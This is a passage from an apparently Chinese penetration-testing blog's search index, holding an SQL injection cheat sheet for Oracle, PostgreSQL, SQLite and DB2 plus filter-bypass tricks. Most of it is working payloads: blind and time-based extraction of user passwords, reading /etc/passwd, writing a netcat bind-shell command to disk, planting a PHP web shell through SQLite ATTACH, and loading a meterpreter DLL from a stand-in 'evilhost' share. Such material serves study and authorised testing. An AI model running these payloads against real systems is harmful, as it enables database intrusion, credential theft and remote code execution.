1=ctxsys.drithsx.sn(1,(select column_name from (select rownum as limit,column_name from user_tab_columns where table_name ='USERS') where limit=3))-- ?id=1' and 1=ctxsys.drithsx.sn(1,(select passwd from (select passwd,rownum as limit from users) where limit=1))-- ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:23:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"盲注 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:24:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"布尔盲注 既然是盲注，那么肯定涉及到条件判断语句，Oracle除了使用IF the else end if这种复杂的，还可以使用 decode() 函数。 语法：decode(条件,值1,返回值1,值2,返回值2,...值n,返回值n,缺省值); 该函数的含义如下： IF 条件=值1 THEN　RETURN(返回值1) ELSIF 条件=值2 THEN　RETURN(返回值2)　...... ELSIF 条件=值n THEN　RETURN(返回值n) ELSE　RETURN(缺省值) END IF ?id=1' and 1=(select decode(user,'SYSTEM',1,0,0) from dual)-- ?id=1' and 1=(select decode(substr(user,1,1),'S',1,0,0) from dual)-- ?id=1' and ascii(substr(user,1,1))\u003e 64-- #二分法 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:24:1","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"时间盲注 可使用DBMS_PIPE.RECEIVE_MESSAGE('任意值',延迟时间)函数进行时间盲注，这个函数可以指定延迟的时间 AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) comment: -- /**/ ?id=1' and 1=(case when ascii(substr(user,1,1))\u003e 128 then DBMS_PIPE.RECEIVE_MESSAGE('a',5) else 1 end)-- ?id=1' and 1=(case when ascii(substr(user,1,1))\u003e 64 then DBMS_PIPE.RECEIVE_MESSAGE('a',5) else 1 end)-- decode不仅可以在布尔盲注中运用，也可以用在延迟盲注中 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('RDS',10),0) from dual) -- http://www.jsporcle.com/news.jsp?id=1 and 1=(select decode(substr(user,1,1),'S',dbms_pipe.receive_message('RDS',5),0) from dual) -- 当然，这里延迟的操作不一定用延迟函数，也可以使用花费更多时间去查询所有数据库的条目。例如: (select count(*) from all_objects) http://www.jsporcle.com/news.jsp?id=1 and 1=(select decode(substr(user,1,1),'S',(select count(*) from all_objects),0) from dual) and '1'='1' 通过这种明显时间差也能判断注入表达式的结果。 PostgreSQL注入 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:24:2","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"注入流程 #order by 猜字段 219.153.49.228:47148/new_list.php?id=1 order by 4 #判断是否为postgresql ?id=1 and 1::int=1-- #全部用null填充 方便在测试类型 ?id=-1 union select null,null,null,null #测试类型， 这里为字符类型 ?id=-1 union select null,'null','null',null #当前数据库 ?id=-1 union select null,current_database(),'null',null #表名 ?id=-1 union select null,relname,'null',null from pg_stat_user_tables limit 1 offset 1 #列名 分析解说：通过SQL语句中联合查询，修改offset后面的数字得到2个字段，和字段名 ?id=-1 union select null,column_name,'null',null from+information_schema.columns where table_name='reg_users' limit 1 offset 1 #字段值 offset不断改变值，依次获取值 通过SQL语句联合查询，显示出key的MD5值。 ?id=-1 union select null,'null','用户名:'||name||',密码:'||password||',状态:'||status||',id:'||id,null from reg_users limit 1 offset 0 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:25:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"常用查询 注释 -- /**/ 查看数据库版本 SELECT version() 查看当前用户 SELECT user; SELECT current_user; SELECT session_user; SELECT usename FROM pg_user; SELECT getpgusername(); 查看当前用户是否超级用户 SHOW is_superuser; SELECT current_setting('is_superuser'); SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER 列数据库 SELECT datname FROM pg_database 列出表 SELECT table_name FROM information_schema.tables 列出列名 SELECT column_name FROM information_schema.columns WHERE table_name='data_table' ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:26:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"报错注入 ,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC) ,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC) ' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1 ' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:27:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"盲注 ' and substr(version(),1,10) = 'PostgreSQL' and '1 -\u003e OK ' and substr(version(),1,10) = 'PostgreXXX' and '1 -\u003e KO ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:28:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"时间盲注 AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:28:1","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"文件操作 读取文件 select pg_ls_dir('./'); select pg_read_file('PG_VERSION', 0, 200); 早期版本的pg_read_file和pg_ls_dir不支持绝对路径，但是新版本将允许超级用户或者在default_role_read_server_files组中的用户使用: CREATE TABLE temp(t TEXT); COPY temp FROM '/etc/passwd'; SELECT * FROM temp limit 1 offset 0; SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OID SELECT lo_get(16420); -- use the OID returned from the above SELECT * from pg_largeobject; -- or just get all the large objects and their data 写文件 CREATE TABLE pentestlab (t TEXT); INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash'); SELECT * FROM pentestlab; COPY pentestlab(t) TO '/tmp/pentestlab'; 一行： COPY (SELECT 'nc -lvvp 2346 -e /bin/bash') TO '/tmp/pentestlab'; ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:29:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Bypass Filter Using CHR SELECT CHR(65)||CHR(66)||CHR(67); Using Dollar-signs ( \u003e= version 8 PostgreSQL) SELECT $$This is a string$$ SELECT $TAG$This is another string$TAG$ SQLite注入 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:30:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SQLite comments -- /**/ ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:31:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"SQLite version select sqlite_version(); ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:32:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"String based - Extract database structure SELECT sql FROM sqlite_schema ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:33:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Integer/String based - Extract table name SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' Use limit X+1 offset X, to extract all tables. ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:34:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Integer/String based - Extract column name SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='table_name' For a clean output SELECT replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')%2b1)),instr((substr(sql,instr(sql,'(')%2b1)),'')),\"TEXT\",''),\"INTEGER\",''),\"AUTOINCREMENT\",''),\"PRIMARY KEY\",''),\"UNIQUE\",''),\"NUMERIC\",''),\"REAL\",''),\"BLOB\",''),\"NOT NULL\",''),\",\",'~~') FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='table_name' ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:35:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Boolean - Count number of tables and (SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) \u003c number_of_table ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:36:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Boolean - Enumerating table name and (SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0)=table_name_length_number ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:37:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Boolean - Extract info and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0) \u003e hex('some_char') ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:38:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Time based AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:39:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Remote Command Execution using SQLite command - Attach Database ATTACH DATABASE '/var/www/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('\u003c?php system($_GET['cmd']); ?\u003e');-- ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:40:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Remote Command Execution using SQLite command - Load_extension UNION SELECT 1,load_extension('\\\\evilhost\\evilshare\\meterpreter.dll','DllMain');-- Note: By default this component is disabled ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:41:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"DB2注入 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Version select versionnumber, version_timestamp from sysibm.sysversions; select service_level from table(sysproc.env_get_inst_info()) as instanceinfo select getvariable('sysibm.version') from sysibm.sysdummy1 -- (v8+) select prod_release,installed_prod_fullname from table(sysproc.env_get_prod_info()) as productinfo select service_level,bld_level from sysibmadm.env_inst_info ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:1","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Comments select blah from foo -- comment like this (double dash) ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:2","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Current User select user from sysibm.sysdummy1 select session_user from sysibm.sysdummy1 select system_user from sysibm.sysdummy1 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:3","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"List Users DB2 uses OS accounts select distinct(authid) from sysibmadm.privileges -- priv required select grantee from syscat.dbauth -- incomplete results select distinct(definer) from syscat.schemata -- more accurate select distinct(grantee) from sysibm.systabauth -- same as previous ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:4","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"List Privileges select * from syscat.tabauth -- shows priv on tables select * from syscat.tabauth where grantee = current user -- shows privs for current user select * from syscat.dbauth where grantee = current user;; select * from SYSIBM.SYSUSERAUTH — List db2 system privilegies ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:5","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"List DBA Accounts select distinct(grantee) from sysibm.systabauth where CONTROLAUTH='Y' select name from SYSIBM.SYSUSERAUTH where SYSADMAUTH = ‘Y’ or SYSADMAUTH = ‘G’ ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:6","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Current Database select current server from sysibm.sysdummy1 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:7","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"List Databases select distinct(table_catalog) from sysibm.tables SELECT schemaname FROM syscat.schemata; ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:8","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"List Columns select name, tbname, coltype from sysibm.syscolumns -- also valid syscat and sysstat ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:9","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"List Tables select table_name from sysibm.tables select name from sysibm.systables ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:10","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Find Tables From Column Name select tbname from sysibm.syscolumns where name='username' ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:11","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Select Nth Row select name from (select * from sysibm.systables order by name asc fetch first N rows only) order by name desc fetch first row only ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:12","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Select Nth Char select substr('abc',2,1) FROM sysibm.sysdummy1 -- returns b ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:13","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Bitwise AND/OR/NOT/XOR select bitand(1,0) from sysibm.sysdummy1 -- returns 0. Also available bitandnot, bitor, bitxor, bitnot ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:14","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"ASCII Value Char select chr(65) from sysibm.sysdummy1 -- returns 'A' ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:15","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Char -\u003e ASCII Value select ascii('A') from sysibm.sysdummy1 -- returns 65 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:16","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Casting select cast('123' as integer) from sysibm.sysdummy1 select cast(1 as char) from sysibm.sysdummy1 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:17","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"String Concat select 'a' concat 'b' concat 'c' from sysibm.sysdummy1 -- returns 'abc' select 'a' || 'b' from sysibm.sysdummy1 -- returns 'ab' ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:18","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"IF Statement Seems only allowed in stored procedures. Use case logic instead. ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:19","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Case Statement select CASE WHEN (1=1) THEN 'AAAAAAAAAA' ELSE 'BBBBBBBBBB' END from sysibm.sysdummy1 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:20","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Avoiding Quotes SELECT chr(65)||chr(68)||chr(82)||chr(73) FROM sysibm.sysdummy1 -- returns “ADRI”. Works without select too ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:21","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Time Delay Heavy queries, for example: If user starts with ascii 68 (‘D’), the heavy query will be executed, delaying the response. However, if user doesn’t start with ascii 68, the heavy query won’t execute and thus the response will be faster. ' and (SELECT count(*) from sysibm.columns t1, sysibm.columns t2, sysibm.columns t3)\u003e0 and (select ascii(substr(user,1,1)) from sysibm.sysdummy1)=68 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:22","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Serialize to XML (for error based) select xmlagg(xmlrow(table_schema)) from sysibm.tables -- returns all in one xml-formatted string select xmlagg(xmlrow(table_schema)) from (select distinct(table_schema) from sysibm.tables) -- Same but without repeated elements select xml2clob(xmelement(name t, table_schema)) from sysibm.tables -- returns all in one xml-formatted string (v8). May need CAST(xml2clob(… AS varchar(500)) to display the result. ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:23","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Command Execution and Local File Access Seems it’s only allowed from procedures or UDFs. ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:24","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Hostname/IP and OS INFO select os_name,os_version,os_release,host_name from sysibmadm.env_sys_info -- requires priv ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:25","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Location of DB Files select * from sysibmadm.reg_variables where reg_var_name='DB2PATH' -- requires priv ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:26","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"System Config select dbpartitionnum, name, value from sysibmadm.dbcfg where name like 'auto_%' -- Requires priv. Retrieve the automatic maintenance settings in the database configuration that are stored in memory for all database partitions. select name, deferred_value, dbpartitionnum from sysibmadm.dbcfg -- Requires priv. Retrieve all the database configuration parameters values stored on disk for all database partitions. ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:27","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"Default System Database SYSIBM SYSCAT SYSSTAT SYSPUBLIC SYSIBMADM SYSTOOLs Bypass 把每个SQL关键字两侧可插入的点称之为“位”，如下图： ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:42:28","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"位置一 (1)注释符 /**/ %23 --+ /*!50000union*/ # id=2/**/union select 1,user,3 from admin (2)空白符 %09 %0a %0b %0c %0d %20 %a0 # id= 1 %0a union select 1,user,3 from admin (3)科学计算法 # e # . id= 2e0 union select 1,user,3 from admin id= 1.union select 1,user,3 from admin id= 1.1union select 1,user,3 from admin # 还有: %1%2E %2%2E %3%2E id= 1' %1%2Eunion select user(),2 %23 (4)单引号双引号 id= 1' 'xx'union select user(),2 %23 id= 1' \"\"union select user(),2 %23 # 需要闭合的先闭合，然后成对使用单双引号 (5)x@ 假设SQL语句为：select * from article where id = '2' # %@ *@ -@ +@ /@ \u003c@ =@ \u003e@ ^@ |@ %26@ -@'' -@\"\" -@@new id=' -@ union select 1,2 ,3 %23 id=' %26@ union select 1,2 ,3 %23 id=' -@'' union select 1,2 ,3 %23 id=' -@@new union select 1,2 ,3 %23 (6){x key} 假设SQL语句为：select * from article where id = '2' id=' and {x -2} union select 1,2,3 %23 id=' || !{`x` -2} union select 1,2,3 %23 id=' || !{`x` -@} union select 1,2,3 %23 id=' and {x id} union select 1,2,3 %23 id=' and {x id} union select 1,2,3 %23 id=' and {id (select/**/--0)}union select 1,2,3 %23 (7) 其他 \\Nunion select 1,2,3 %23 null union select 1,2,3 %23 (8)函数 and MD5('a') union select 1,password,database() from users--+ and binary @ union select 1,password,3 from users--+ and ST_X(Point(1, 2)) union select 1,password,database() from users--+ ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:43:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"位置二 (1) 空白符 %09,%0a,%0b,%0c,%0d,%20 id= 1 union%0aselect 1,user,3 from admin (2)注释 /*!*/ /**/ id= 1 union /**/select 1,user,3 from admin (3)括号 union(select 1,(password),3,4,5,6 from(users)) %23 (4) ALL | DISTINCT | DISTINCTROW union ALL select 1,password,3 from users %23 (5)函数分隔 %09%0A %0D%0b %0b%0A %09%0C %09%23%0A --%0A %23%0A --+\\N%0A %23%f0%0A ... union%23%0Aselect 1,password,3 from users %23 union-- xx%0Aselect 1,password,3 from users %23 ","date":"2022-01-19","objectID":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:44:0","tags":["SQL注入","代码审计"],"title":"SQL注入漏洞","uri":"/sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"位置三 (1) 空白符 %09,%0a,%0b,%0c,%0d,%20 union select %09 1,password,3 from users %23 (2)注释 /*!*/ /**/ union select /**/ 1,password,3 from users %23 (3) ALL | DISTINCT | DISTINCTROW union select ALL 1,password,3 from users %23 (4) {} () union select{x 1},password,3 from users %23 union select(1),password,3 from users %23 (5)符号 + - @ ~ ! union select+1,password,3 from users %23 \" ' 单双引号 union select\"\"a1,password,3 from users %23 union select+1,password,3 from users %23 组合 +@ +'' -@ -'' ~@ ~'' ~\"\" !@ 